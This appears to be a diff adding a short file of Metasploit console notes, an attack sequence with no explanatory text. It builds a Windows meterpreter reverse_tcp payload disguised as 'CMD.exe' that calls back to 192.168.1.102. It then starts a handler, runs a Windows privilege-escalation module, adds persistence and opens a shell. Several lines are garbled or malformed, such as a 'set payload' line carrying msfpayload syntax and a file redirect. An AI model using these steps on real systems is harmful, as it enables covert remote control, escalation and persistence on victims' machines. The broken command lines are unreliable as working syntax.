@@ -1,0 +1,22 @@
+service metasploit start
+msfconsole
+banner-change image
+help
+search -h
+search name:meterpreter
+
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.102 x > /root/Desktop/CMD.exe
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp LHOST=192.168.1.102 x > /root/Desktop/CMD.exe
+set LHOST 192.168.1.102
+
+use post/windows/escalate
+session -l
+session -i 6
+run persistence -h
+help
+
+shell
+
+
